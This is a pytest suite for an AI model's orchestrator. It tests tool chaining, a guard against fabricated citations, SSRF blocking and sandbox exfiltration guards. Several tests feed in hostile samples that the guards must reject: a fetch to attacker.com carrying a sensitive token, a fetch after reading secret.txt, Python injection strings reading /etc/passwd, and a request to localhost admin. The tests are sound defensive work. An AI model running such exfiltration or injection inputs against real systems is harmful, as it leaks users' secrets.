"""
Project Lucca — Multi-Step Tool Chaining, Browser & Citation Provenance Tests
Spec 09 §5, Spec 10 §4, ADR-004, Dimension 7B
Validates:
1. Multi-step ReAct chaining: search_web -> fetch_url -> narration.
2. Max-rounds boundary termination and Forced Final Synthesis.
3. Fallback retry on tool error across rounds.
4. SequenceGuard enforcement across LLM rounds (anti-exfiltration).
5. Output Supervisor Citation Provenance Guard (Tier 1 Abort on fabricated citations).
6. Whitelisted doc domain exemptions.
7. Link triage & followability re-ranking.
8. Headless browser rendering and SSRF blocking.
9. Native PDF text extraction.
"""

from __future__ import annotations

import io
from pathlib import Path

import pytest
from pypdf import PdfWriter

from lucca.core.orchestrator import Orchestrator
from lucca.core.schemas import Done, LLMUsage, TokenDelta, ToolCall, ToolCallEnd
from lucca.core.trace import TurnTrace
from lucca.sandbox.browser_tool import HeadlessBrowserTool
from lucca.sandbox.output_supervisor import (
    OutputSupervisorSession,
    SeverityTier,
)
from lucca.sandbox.search_tool import classify_link_followability
from lucca.sandbox.web_tool import fetch_url
from tests.fakes.fake_asr import FakeASR
from tests.fakes.fake_llm import FakeLLM
from tests.fakes.fake_tts import FakeTTS


@pytest.fixture
def workspace_tmp(tmp_path: Path) -> Path:
    ws = tmp_path / "workspace"
    ws.mkdir(parents=True, exist_ok=True)
    return ws


# ============================================================================
# 1. Multi-Step Tool Chaining Tests
# ============================================================================


def test_tool_chain_search_then_fetch(workspace_tmp: Path, monkeypatch: pytest.MonkeyPatch):
    """
    Round 1: LLM calls search_web.
    Round 2: LLM inspects tool_messages and calls fetch_url on the top result.
    Round 3: LLM emits final grounded narration.
    Asserts: LLM ran 3 rounds, tool_messages accumulated across rounds, history recorded narration.
    """

    # Mock search_web and fetch_url to be fast and hermetic
    def mock_search_web(query: str, max_results: int = 5):
        return {
            "query": query,
            "ok": True,
            "results": [
                {
                    "title": "Judicial Directory",
                    "url": "https://judiciary.example.gov/judge_quintos",
                    "snippet": "Presiding Judge Beverly Ann Quintos appointed to MTC.",
                    "category": "html_page",
                    "followable": True,
                }
            ],
        }, "1. Judicial Directory\n   Source: https://judiciary.example.gov/judge_quintos\n"

    def mock_fetch_url(url: str, **kwargs):
        return {
            "url": url,
            "status_code": 200,
            "content_type": "text/html",
        }, "# Official Record\nJudge Beverly Ann F. Quintos serves as Presiding Judge at MTC."

    monkeypatch.setattr("lucca.sandbox.service.search_web", mock_search_web)
    monkeypatch.setattr("lucca.sandbox.service.fetch_url", mock_fetch_url)

    rounds = [
        # Round 1: Model calls search_web
        [
            ToolCallEnd(
                call=ToolCall(call_id="call-s1", tool="search_web", args={"query": "Judge Quintos"})
            ),
            Done(usage=LLMUsage(prompt_tokens=10, completion_tokens=5)),
        ],
        # Round 2: Model calls fetch_url on the returned result
        [
            ToolCallEnd(
                call=ToolCall(
                    call_id="call-f1",
                    tool="fetch_url",
                    args={"url": "https://judiciary.example.gov/judge_quintos"},
                )
            ),
            Done(usage=LLMUsage(prompt_tokens=20, completion_tokens=5)),
        ],
        # Round 3: Model narrates verified facts
        [
            TokenDelta(
                delta="Judge Beverly Ann F. Quintos is a Presiding Judge according to official records."
            ),
            Done(usage=LLMUsage(prompt_tokens=30, completion_tokens=15)),
        ],
    ]

    llm = FakeLLM(rounds=rounds)
    orch = Orchestrator(
        tts=FakeTTS,
        asr=FakeASR,
        execute_tools=True,
    )
    orch.llm = llm

    trace = TurnTrace(trace_id="test-trace-1")
    orch._run_text_turn(trace, "Who is Judge Quintos?")

    assert llm.call_count == 3
    # Check that Round 2 received Round 1's tool_messages
    r2_kwargs = llm.all_kwargs[1]
    assert r2_kwargs.get("tool_messages") is not None
    r2_tools = [m.name for m in r2_kwargs["tool_messages"] if m.role == "tool"]
    assert "search_web" in r2_tools

    # Check that Round 3 received both tools in tool_messages
    r3_kwargs = llm.all_kwargs[2]
    assert r3_kwargs.get("tool_messages") is not None
    r3_tools = [m.name for m in r3_kwargs["tool_messages"] if m.role == "tool"]
    assert "search_web" in r3_tools
    assert "fetch_url" in r3_tools

    # Check that history contains the assistant response
    assert any(
        "Presiding Judge" in msg["content"] for msg in orch.history if msg["role"] == "assistant"
    )


def test_tool_chain_max_rounds_boundary(workspace_tmp: Path):
    """
    Revised by WO-9 A5 (F5): the loop converges when the model stops calling
    tools — tools stay available past the old fixed quota of 3. The hard cap
    (8) is a runaway guard only. This test verifies 2 tool rounds + a plain
    narration round converge cleanly at round 3 with tools still offered.
    """
    rounds = [
        [
            ToolCallEnd(call=ToolCall(call_id="c1", tool="query_capabilities", args={})),
            Done(usage=LLMUsage(prompt_tokens=5, completion_tokens=2)),
        ],
        [
            ToolCallEnd(call=ToolCall(call_id="c2", tool="query_capabilities", args={})),
            Done(usage=LLMUsage(prompt_tokens=10, completion_tokens=2)),
        ],
        [
            # Convergence: no tool call -> loop terminates after this round
            TokenDelta(delta="I have verified all capabilities across multiple steps."),
            Done(usage=LLMUsage(prompt_tokens=15, completion_tokens=10)),
        ],
    ]

    llm = FakeLLM(rounds=rounds)
    orch = Orchestrator(
        tts=FakeTTS,
        asr=FakeASR,
        execute_tools=True,
    )
    orch.llm = llm

    trace = TurnTrace(trace_id="test-trace-2")
    orch._run_text_turn(trace, "Check capabilities")

    assert llm.call_count == 3
    # WO-9 A5: tools are NOT stripped at round 3 anymore — the loop converges
    # on its own; the cap-8 withdrawal only fires on the final round.
    r3_tools = llm.all_kwargs[2].get("tools")
    assert r3_tools, "tools must remain available on non-cap rounds"
    assert trace.rounds_used == 3
    assert trace.cap_hit is False


def test_tool_failure_triggers_retry(workspace_tmp: Path, monkeypatch: pytest.MonkeyPatch):
    """
    Round 1 tool fails (e.g. 404 / connection error).
    Round 2 LLM inspects the error in tool_messages and invokes a fallback tool.
    Round 3 completes narration cleanly.
    """
    call_log: list[str] = []

    def mock_fetch_url(url: str, **kwargs):
        call_log.append(url)
        if "broken" in url:
            raise RuntimeError("HTTP 404 Not Found")
        return {"url": url, "status_code": 200}, "Fallback page content retrieved."

    monkeypatch.setattr("lucca.sandbox.service.fetch_url", mock_fetch_url)

    rounds = [
        # Round 1: Model tries broken URL
        [
            ToolCallEnd(
                call=ToolCall(
                    call_id="c-fail", tool="fetch_url", args={"url": "https://example.com/broken"}
                )
            ),
            Done(usage=LLMUsage(prompt_tokens=10, completion_tokens=5)),
        ],
        # Round 2: Model sees error and calls fallback URL
        [
            ToolCallEnd(
                call=ToolCall(
                    call_id="c-ok", tool="fetch_url", args={"url": "https://example.com/backup"}
                )
            ),
            Done(usage=LLMUsage(prompt_tokens=20, completion_tokens=5)),
        ],
        # Round 3: Model finishes narration
        [
            TokenDelta(
                delta="The primary source was unavailable, but the backup confirmed the details."
            ),
            Done(usage=LLMUsage(prompt_tokens=30, completion_tokens=10)),
        ],
    ]

    llm = FakeLLM(rounds=rounds)
    orch = Orchestrator(tts=FakeTTS, asr=FakeASR, execute_tools=True)
    orch.llm = llm

    trace = TurnTrace(trace_id="test-trace-3")
    orch._run_text_turn(trace, "Find details")

    assert llm.call_count == 3
    assert call_log == ["https://example.com/broken", "https://example.com/backup"]
    assert any(
        "backup confirmed" in msg["content"] for msg in orch.history if msg["role"] == "assistant"
    )


def test_sequence_guard_across_llm_rounds(workspace_tmp: Path):
    """
    Round 1: LLM calls read_file.
    Round 2: LLM attempts search_web.
    SequenceGuard blocks search_web with exit code -2 (exfiltration prevention),
    error is passed into tool_messages, and LLM narrates refusal.
    """
    rounds = [
        # Round 1: read_file
        [
            ToolCallEnd(
                call=ToolCall(call_id="c-read", tool="read_file", args={"path": "notes.txt"})
            ),
            Done(usage=LLMUsage(prompt_tokens=10, completion_tokens=5)),
        ],
        # Round 2: attempt search_web after read_file in same turn
        [
            ToolCallEnd(
                call=ToolCall(call_id="c-web", tool="search_web", args={"query": "leaked info"})
            ),
            Done(usage=LLMUsage(prompt_tokens=20, completion_tokens=5)),
        ],
        # Round 3: narrate refusal based on tool rejection
        [
            TokenDelta(delta="I cannot search the web after inspecting local workspace files."),
            Done(usage=LLMUsage(prompt_tokens=30, completion_tokens=10)),
        ],
    ]

    llm = FakeLLM(rounds=rounds)
    orch = Orchestrator(tts=FakeTTS, asr=FakeASR, execute_tools=True)
    orch.sandbox.workspace_mgr.workspace_root = workspace_tmp
    orch.sandbox.file_tool.workspace_root = workspace_tmp
    test_file = workspace_tmp / "notes.txt"
    test_file.write_text("Confidential project notes.", encoding="utf-8")
    orch.llm = llm

    trace = TurnTrace(trace_id="test-trace-4")
    orch._run_text_turn(trace, "Read notes and search web")

    assert llm.call_count == 3
    # Check that Round 3 received the SequenceGuard error
    r3_tool_msgs = llm.all_kwargs[2].get("tool_messages", [])
    web_res = [m for m in r3_tool_msgs if m.role == "tool" and m.name == "search_web"]
    assert len(web_res) == 1
    assert "Forbidden sequence" in web_res[0].content


# ============================================================================
# 2. Output Supervisor Citation Provenance Guard Tests
# ============================================================================


def test_citation_provenance_guard_blocks_fabricated_url():
    """
    Supervisor catches ungrounded citation in raw_text, triggers Tier 1 abort.
    """
    session = OutputSupervisorSession()
    session.register_allowed_urls(["https://jbc.judiciary.gov.ph/verified-interview.pdf"])

    # Clause citing a fabricated URL not in allowed_urls
    clause = "You can find her profile at https://sc.judiciary.gov.ph/fabricated-database/judge."
    emitted, should_abort = session.feed_chunk(None, clause)

    # Initial candidate held in lookahead buffer
    assert session.pending_tier1_chunk is not None
    assert session.pending_tier1_chunk[1].breach_type == "ungrounded_citation"

    # End of stream flushes -> abort commits
    _, final_abort = session.flush()
    assert final_abort is True


def test_citation_provenance_guard_allows_verified_url():
    """
    Supervisor permits a verified URL that was returned in tool receipts.
    """
    session = OutputSupervisorSession()
    session.register_allowed_urls(["https://jbc.judiciary.gov.ph/verified-interview.pdf"])

    clause = "According to official records (https://jbc.judiciary.gov.ph/verified-interview.pdf), she was scheduled for interview."
    emitted, should_abort = session.feed_chunk(None, clause)

    assert should_abort is False
    assert len(emitted) == 1
    assert emitted[0][1].severity == SeverityTier.PASS


def test_citation_provenance_guard_allows_whitelisted_doc_urls():
    """
    Supervisor permits documentation roots (github.com, python.org) without prior tool receipts.
    """
    session = OutputSupervisorSession()

    clause = "The source code is hosted on https://github.com/seatr/ProjectLucca and uses https://docs.python.org."
    emitted, should_abort = session.feed_chunk(None, clause)

    assert should_abort is False
    assert len(emitted) == 1
    assert emitted[0][1].severity == SeverityTier.PASS


def test_citation_provenance_guard_allows_prior_turn_url():
    """
    Cross-turn session continuity: URLs registered in Turn 1 remain valid in Turn 2.
    """
    session = OutputSupervisorSession()
    # Turn 1
    session.register_allowed_urls(["https://example.gov/court-record"])
    session.reset_turn()  # Ephemeral turn reset must NOT clear allowed_urls!

    # Turn 2
    clause = "As mentioned earlier at https://example.gov/court-record, she was appointed in 2022."
    emitted, should_abort = session.feed_chunk(None, clause)

    assert should_abort is False
    assert len(emitted) == 1
    assert emitted[0][1].severity == SeverityTier.PASS


# ============================================================================
# 3. Link Triage & Followability Tests (Path 1)
# ============================================================================


def test_classify_link_followability():
    """
    Validates classification of social media walls, PDFs, and HTML web pages.
    """
    # Social media / login walls
    cat, followable, _ = classify_link_followability(
        "https://www.facebook.com/centurion.barops/posts/123"
    )
    assert cat == "login_wall"
    assert followable is False

    cat, followable, _ = classify_link_followability(
        "https://ph.linkedin.com/in/beverly-ann-camacho"
    )
    assert cat == "login_wall"
    assert followable is False

    # PDF documents
    cat, followable, _ = classify_link_followability(
        "https://jbc.judiciary.gov.ph/schedules/Interview.pdf"
    )
    assert cat == "pdf_document"
    assert followable is True

    # Standard HTML pages
    cat, followable, _ = classify_link_followability(
        "https://sc.judiciary.gov.ph/judges-directory/"
    )
    assert cat == "html_page"
    assert followable is True


# ============================================================================
# 4. Native PDF Text Extraction Tests
# ============================================================================


def test_native_pdf_extraction_in_fetch_url(monkeypatch: pytest.MonkeyPatch):
    """
    Verifies that fetch_url parses PDF byte streams using pypdf instead of blocking.
    """
    # Create an in-memory PDF with pypdf
    writer = PdfWriter()
    writer.add_blank_page(width=200, height=200)
    pdf_bytes = io.BytesIO()
    writer.write(pdf_bytes)
    pdf_bytes.seek(0)
    raw_pdf = pdf_bytes.read()

    class FakeResponse:
        status_code = 200
        headers = {"content-type": "application/pdf"}
        content = raw_pdf
        is_redirect = False
        url = "https://example.com/document.pdf"

    class FakeClient:
        def __init__(self, *args, **kwargs):
            pass

        def __enter__(self):
            return self

        def __exit__(self, *args):
            pass

        def get(self, url, headers=None):
            return FakeResponse()

    monkeypatch.setattr("httpx.Client", FakeClient)
    # Fake DNS (public IPv4 only) so the SSRF pre-check is network-independent:
    # hosts whose DNS returns AAAA for example.com otherwise trip the (correct)
    # IPv6 block. See F-FEAT review 2026-09-26.
    monkeypatch.setattr(
        "socket.getaddrinfo", lambda host, port, *a, **k: [(2, 1, 6, "", ("93.184.216.34", 443))]
    )

    struct, text = fetch_url("https://example.com/document.pdf")
    assert struct["status_code"] == 200
    assert struct["content_type"] == "application/pdf"
    assert struct["pdf_pages"] == 1


# ============================================================================
# 5. Headless Browser & SSRF Tests (Path 2)
# ============================================================================


def test_browser_tool_ssrf_blocks_private_ip():
    """
    Validates that HeadlessBrowserTool blocks navigation to private/local IPs.
    """
    from lucca.core.exceptions import SandboxPathError

    tool = HeadlessBrowserTool()
    with pytest.raises(SandboxPathError) as exc_info:
        tool.render_url("http://127.0.0.1:8080/admin")
    assert exc_info.value.code == "ssrf_blocked"


def test_browser_hardened_args_include_host_resolver_rules():
    """
    Validates that HARDENED_BROWSER_ARGS includes socket-level host-resolver-rules.
    """
    from lucca.sandbox.browser_tool import HARDENED_BROWSER_ARGS

    resolver_rule = any(
        "--host-resolver-rules" in arg and "127.*" in arg for arg in HARDENED_BROWSER_ARGS
    )
    assert resolver_rule is True


def test_subpath_hallucination_blocked_on_root_domain():
    """
    Validates that having a root domain in allowed_urls does NOT permit citing arbitrary subpaths.
    """
    session = OutputSupervisorSession()
    session.register_allowed_urls(["https://jbc.judiciary.gov.ph"])

    clause = "Her bio is at https://jbc.judiciary.gov.ph/fake-announcements/sc-appointment-quintos-bio.html"
    emitted, should_abort = session.feed_chunk(None, clause)

    assert session.pending_tier1_chunk is not None
    assert session.pending_tier1_chunk[1].breach_type == "ungrounded_citation"

    _, final_abort = session.flush()
    assert final_abort is True


def test_schemeless_fqdn_caught_by_provenance():
    """
    Validates that scheme-less news/legal domain citations are extracted and verified.
    """
    session = OutputSupervisorSession()
    # Unverified scheme-less citation
    clause = "According to rappler.com/news/fake-profile, she was appointed in 2022."
    emitted, should_abort = session.feed_chunk(None, clause)

    assert session.pending_tier1_chunk is not None
    assert session.pending_tier1_chunk[1].breach_type == "ungrounded_citation"


def test_embedded_links_in_documents_allowed():
    """
    Validates that embedded links extracted from documents can be registered and cited.
    """
    session = OutputSupervisorSession()
    # Embedded link discovered inside document
    embedded_doc_link = "https://sc.judiciary.gov.ph/bulletin-2022"
    session.register_allowed_urls([embedded_doc_link])

    clause = f"Further details are available at {embedded_doc_link} as stated in the schedule."
    emitted, should_abort = session.feed_chunk(None, clause)

    assert should_abort is False
    assert len(emitted) == 1
    assert emitted[0][1].severity == SeverityTier.PASS


def test_spelled_word_normalization():
    """Validates detection and reconstruction of spelled-out words from ASR."""
    from lucca.core.orchestrator import normalize_spelled_words

    text1, words1 = normalize_spelled_words("It is spelled F-A-W-K-N-E-R in Victoria")
    assert "Fawkner" in text1
    assert words1 == ["Fawkner"]

    text2, words2 = normalize_spelled_words("No, F A W K N E R")
    assert "Fawkner" in text2
    assert words2 == ["Fawkner"]

    text3, words3 = normalize_spelled_words("F. A. W. K. N. E. R.")
    assert "Fawkner" in text3
    assert words3 == ["Fawkner"]

    # Normal sentences should not produce false positive words
    text4, words4 = normalize_spelled_words("I see a cat in the room")
    assert words4 == []


def test_in_place_context_token_neutralization():
    """Validates that phonetic/orthographic corrupt tokens in history are rewritten without amnesia."""
    from lucca.core.orchestrator import Orchestrator

    orch = Orchestrator.__new__(Orchestrator)
    orch.history = [
        {"role": "user", "content": "Tell me about Faulkner in Victoria."},
        {
            "role": "assistant",
            "content": "William Faulkner was an American author from Mississippi.",
        },
        {"role": "user", "content": "No, F-A-W-K-N-E-R, not the writer."},
    ]
    replaced = orch._neutralize_context_attractors("Fawkner")
    assert "Faulkner" in replaced
    # Verify in-place rewrite preserved structure and pronouns
    assert "Fawkner" in orch.history[0]["content"]
    assert "Faulkner" not in orch.history[0]["content"]
    assert "Fawkner" in orch.history[1]["content"]
    assert "Faulkner" not in orch.history[1]["content"]


def test_category_aware_search_grounding(workspace_tmp: Path):
    """Validates that search queries preserve location and category keywords and correct spelled targets."""
    from lucca.core.orchestrator import Orchestrator

    orch = Orchestrator.__new__(Orchestrator)
    orch.active_detected_words = ["Fawkner"]
    orch.current_turn_transcript = "Tell me about Fawkner, Victoria suburb"
    orch.history = [{"role": "user", "content": "Fawkner suburb in Victoria Australia"}]
    orch.execute_tools = True
    orch.executed_tools = []
    orch.current_turn_tool_calls = []

    executed_query = None

    class FakeSandbox:
        taint_flags = 0

        def check_confirmation_needed(self, name):
            return False

        def execute_tool(self, call_id, tool_name, args, confirmed=True, human_confirmed=False):
            nonlocal executed_query
            executed_query = args.get("query")
            from lucca.core.schemas import ToolResult

            return ToolResult(call_id=call_id, ok=True, content="ok", elapsed_ms=1.0)

    orch.sandbox = FakeSandbox()
    orch.bdi_validator = None
    orch.rule_engine = type("FakeRuleEngine", (), {"rules": {}})()

    from lucca.core.trace import TurnTrace

    trace = TurnTrace(trace_id="t1", session_id="s1", origin="text")
    orch._handle_tool_call(trace, "search_web", {"query": "Faulkner"}, speak=False)

    assert executed_query is not None
    assert "Fawkner" in executed_query
    assert "Faulkner" not in executed_query
    assert "suburb" in executed_query.lower()
    assert "victoria" in executed_query.lower()


def test_stalling_question_clamped_from_voice():
    """Validates that Output Supervisor suppresses rhetorical stalling questions from voice emission."""
    session = OutputSupervisorSession()
    clause1 = "Judge Beverly Ann F. Quintos is the Presiding Judge."
    emitted1, abort1 = session.feed_chunk(None, clause1)
    assert len(emitted1) == 1
    assert abort1 is False

    clause2 = "Would you like me to look into her current court assignment?"
    emitted2, abort2 = session.feed_chunk(None, clause2)
    # Stalling question suppressed from voice output
    assert len(emitted2) == 0
    assert abort2 is False
    assert session.turn_has_stalled is True


def test_factual_inquiry_and_followup_tool_gating():
    """Validates that factual queries and affirmations classify as web_fetch and never suppress tools."""
    from lucca.router.heuristic import HeuristicRouter

    router = HeuristicRouter()

    factual_queries = [
        "Where is she serving as a judge?",
        "Where is Branch 42?",
        "Who is Beverly Ann F. Quintos?",
        "Tell me about Fawkner Victoria",
        "How about you just tell me interesting facts about it?",
        "What is Judge Quintos' current assignment?",
    ]

    for q in factual_queries:
        intent, conf, _ = router.classify_intent(q)
        assert intent == "web_fetch", f"Expected web_fetch for '{q}', got '{intent}'"
        assert conf >= 0.80

    # Ensure memory query remains protected
    mem_intent, _, _ = router.classify_intent("What is my brother's name?")
    assert mem_intent == "memory_query"

    # Ensure greetings remain chit_chat
    chit_intent, _, _ = router.classify_intent("Hello how are you doing?")
    assert chit_intent == "chit_chat"


# ============================================================================
# Phase 4 (WO-17): calc_math & Provenance Split Tests
# ============================================================================


def test_calc_math_safe_evaluation(workspace_tmp: Path):
    """WO-17 Phase 4: Validates AST math evaluation safety and operations."""
    from lucca.sandbox.service import SandboxService, evaluate_math_expr

    # Basic arithmetic and functions
    assert evaluate_math_expr("1982 - 1917") == 65
    assert evaluate_math_expr("53 * 72 / 4") == 954.0
    assert evaluate_math_expr("abs(-42)") == 42
    assert evaluate_math_expr("math.sqrt(256)") == 16.0
    assert evaluate_math_expr("min(10, 5, 20)") == 5
    assert evaluate_math_expr("max(10, 5, 20)") == 20
    assert evaluate_math_expr("sum([1, 2, 3, 4, 5])") == 15
    assert evaluate_math_expr("2 ** 8") == 256

    # Test via SandboxService
    svc = SandboxService(workspace_root=workspace_tmp, use_direct_fallback=True)
    res = svc.execute_tool("m1", "calc_math", {"expr": "1982 - 1917"})
    assert res.ok is True
    assert res.content == "65"
    assert res.structured == {"expr": "1982 - 1917", "result": 65}

    # Division by zero
    res_div = svc.execute_tool("m2", "calc_math", {"expr": "10 / 0"})
    assert res_div.ok is False
    assert "division by zero" in (res_div.stderr or "")

    # Disallowed expressions / injections
    with pytest.raises(ValueError):
        evaluate_math_expr("__import__('os').system('calc')")
    with pytest.raises(ValueError):
        evaluate_math_expr("open('/etc/passwd')")
    with pytest.raises(ValueError):
        evaluate_math_expr("2 ** 1001")


def test_search_web_to_calc_math_chaining(workspace_tmp: Path):
    """WO-17 Phase 4: search_web followed by calc_math executes cleanly in a single turn."""
    from unittest.mock import patch

    from lucca.sandbox.service import SandboxService

    svc = SandboxService(workspace_root=workspace_tmp, use_direct_fallback=True)

    with patch("lucca.sandbox.service.search_web", return_value=({"ok": True}, "results")):
        res_search = svc.execute_tool("t1", "search_web", {"query": "historical year"})
        assert res_search.ok is True

    # calc_math is Risk.READ and must not be blocked by SequenceGuard
    res_math = svc.execute_tool("t2", "calc_math", {"expr": "2026 - 1982"})
    assert res_math.ok is True
    assert res_math.content == "44"


def test_read_file_to_fetch_url_blocked_even_with_confirmed(workspace_tmp: Path):
    """WO-17 Phase 4: Internal confirmed=True MUST NOT override sequence guard (prevents exfiltration bypass)."""
    (workspace_tmp / "secret.txt").write_text("classified data")
    from lucca.sandbox.service import SandboxService

    svc = SandboxService(workspace_root=workspace_tmp, use_direct_fallback=True)

    # 1. read_file
    res_read = svc.execute_tool("r1", "read_file", {"path": "secret.txt"})
    assert res_read.ok is True

    # 2. fetch_url with confirmed=True (cascade-internal dispatch) -> must still be BLOCKED
    res_fetch = svc.execute_tool(
        "f1",
        "fetch_url",
        {"url": "https://example.com/exfil"},
        confirmed=True,
        human_confirmed=False,
    )
    assert res_fetch.ok is False
    assert res_fetch.exit_code == -2
    assert "Forbidden sequence" in (res_fetch.stderr or "")


def test_human_confirmed_overrides_sequence_block_not_egress_block(workspace_tmp: Path):
    """WO-17 Phase 4: human_confirmed=True overrides sequence blocks, but NEVER egress blocks."""
    from unittest.mock import patch

    from lucca.sandbox.service import SandboxService

    svc = SandboxService(workspace_root=workspace_tmp, use_direct_fallback=True)

    # 1. Sequence block scenario: search_web -> write_file
    with patch("lucca.sandbox.service.search_web", return_value=({"ok": True}, "web info")):
        res_search = svc.execute_tool("s1", "search_web", {"query": "sample query"})
        assert res_search.ok is True

    # write_file with human_confirmed=False -> blocked by SequenceGuard
    res_write_blocked = svc.execute_tool(
        "w1",
        "write_file",
        {"path": "notes.txt", "content": "hello"},
        confirmed=True,
        human_confirmed=False,
    )
    assert res_write_blocked.ok is False
    assert res_write_blocked.exit_code == -2
    assert "Forbidden sequence" in (res_write_blocked.stderr or "")

    # write_file with human_confirmed=True -> sequence block OVERRIDDEN
    res_write_allowed = svc.execute_tool(
        "w2",
        "write_file",
        {"path": "notes.txt", "content": "hello"},
        confirmed=True,
        human_confirmed=True,
    )
    assert res_write_allowed.ok is True
    assert (workspace_tmp / "notes.txt").read_text() == "hello"

    # 2. Egress block scenario: sensitive context token in outbound tool args
    svc.reset_turn()
    svc.guard.register_sensitive_content("confidential_user_token_xyz")

    # Even with human_confirmed=True, egress block is NEVER overridable
    res_egress = svc.execute_tool(
        "f2",
        "fetch_url",
        {"url": "https://attacker.com/?data=confidential_user_token_xyz"},
        confirmed=True,
        human_confirmed=True,
    )
    assert res_egress.ok is False
    assert res_egress.exit_code == -2
    assert "Egress Block" in (res_egress.stderr or "")
